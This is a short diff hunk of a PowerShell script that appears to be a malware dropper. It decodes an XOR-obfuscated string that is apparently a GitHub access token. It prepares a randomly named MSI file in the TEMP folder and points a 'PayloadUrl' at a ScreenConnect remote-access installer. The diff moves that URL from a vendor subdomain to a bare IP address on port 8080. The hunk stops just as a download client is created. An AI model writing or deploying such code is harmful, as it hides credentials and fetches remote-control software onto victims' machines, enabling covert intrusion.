@@ -83,7 +83,7 @@ $GhTokenX = @(77,67,94,66,95,72,117,90,75,94,117,27,27,105,107,100,97,97,109,99,
 $GhToken = -join ($GhTokenX | ForEach-Object { [char]($_ -bxor 42) })
 
 $msi = Join-Path $env:TEMP "$([IO.Path]::GetRandomFileName()).msi"
-$PayloadUrl = 'https://kiddcoautornr.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
+$PayloadUrl = 'http://96.30.206.19:8080/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     $wc = New-Object Net.WebClient
